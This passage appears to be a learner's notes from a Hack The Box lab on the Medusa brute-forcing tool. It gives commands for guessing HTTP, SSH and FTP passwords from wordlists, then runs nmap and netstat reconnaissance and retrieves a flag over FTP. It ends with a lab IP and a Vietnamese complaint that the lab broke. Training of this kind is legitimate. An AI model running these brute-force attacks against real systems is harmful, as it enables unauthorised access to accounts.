  naruto3co@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

In this case, Medusa will:
  Iterate through the list of web servers in web_servers.txt.
  Use the usernames and passwords provided.
  Employ the http module with the GET method to attempt logins.
  
By running multiple threads, Medusa efficiently checks each server for weak credentials.

Testing for Empty or Default Passwords
If you want to assess whether any accounts on a specific host (10.0.0.5) have empty or default passwords (where the password matches the username), you can use:
```bash
  naruto3co@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
This command instructs Medusa to:
  Target the host at 10.0.0.5.
  Use the usernames from usernames.txt.
  Perform additional checks for empty passwords (-e n) and passwords matching the username (-e s).
  Use the appropriate service module (replace service_name with the correct module name).

Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.


# Web Services

In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (SSH) and File Transfer Protocol (FTP) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of Medusa, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
SSH is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like Telnet. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
FTP is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.

We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username sshuser, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.

The following command serves as our starting point:
```bash
  [!bash!]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
Let's break down each component:
  -h <IP>: Specifies the target system's IP address.
  -n <PORT>: Defines the port on which the SSH service is listening (typically port 22).
  -u sshuser: Sets the username for the brute-force attack.
  -P 2023-200_most_used_passwords.txt: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
  -M ssh: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
  -t 3: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.

```bash
[!bash!]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.

Gaining Access
With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:

```bash
  [!bash!]$ ssh sshuser@<IP> -p PORT
```
This command will initiate an interactive SSH session, granting you access to the remote system's command line.

Expanding the Attack Surface
Once inside the system, the next step is identifying other potential attack surfaces. Using netstat (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

```bash
  [!bash!]$ netstat -tulpn | grep LISTEN
  
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
  tcp6       0      0 :::22                   :::*                    LISTEN      -
  tcp6       0      0 :::21                   :::*                    LISTEN      -
```
Further reconnaissance with nmap (within the SSH session) confirms this finding as an ftp server.

```bash
[!bash!]$ nmap localhost
  Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
  Nmap scan report for localhost (127.0.0.1)
  Host is up (0.000078s latency).
  Other addresses for localhost (not scanned): ::1
  Not shown: 998 closed ports
  PORT   STATE SERVICE
  21/tcp open  ftp
  22/tcp open  ssh
  
  Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

Targeting the FTP Server
Having identified the FTP server, you can proceed to brute-force its authentication mechanism.

If we explore the /home directory on the target system, we see an ftpuser folder, which implies the likelihood of the FTP server username being ftpuser. Based on this, we can modify our Medusa command accordingly:
```bash
    [!bash!]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
    
    Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
    
    GENERAL: Parallel Hosts: 1 Parallel Logins: 5
    GENERAL: Total Hosts: 1
    GENERAL: Total Users: 1
    GENERAL: Total Passwords: 197
    ...
    ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
    ...
    GENERAL: Medusa has finished.
```
The key differences here are:
  -h 127.0.0.1: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
  -u ftpuser: Specifies the username ftpuser.
  -M ftp: Selects the FTP module within Medusa.
  -t 5: Increases the number of parallel login attempts to 5.

Retrieving The Flag
Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the get command to download the flag.txt file, which may contain sensitive information.:
```bash
  [!bash!]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
  
  Trying [::1]:21 ...
  Connected to localhost.
  220 (vsFTPd 3.0.5)
  331 Please specify the password.
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  200 Switching to Binary mode.
  ftp> ls
  229 Entering Extended Passive Mode (|||25926|)
  150 Here comes the directory listing.
  -rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
  226 Directory send OK.
  ftp> get flag.txt
  local: flag.txt remote: flag.txt
  229 Entering Extended Passive Mode (|||37251|)
  150 Opening BINARY mode data connection for flag.txt (35 bytes).
  100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
  226 Transfer complete.
  35 bytes received in 00:00 (131.45 KiB/s)
  ftp> exit
  221 Goodbye.

```

https://raw.githubusercontent.com/noder-ss/my-wordlists/refs/heads/prod1/2020-200_most_used_passwords.txt


medusa -h 94.237.48.12 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
Lỗi moẹ cái lab rồi 
















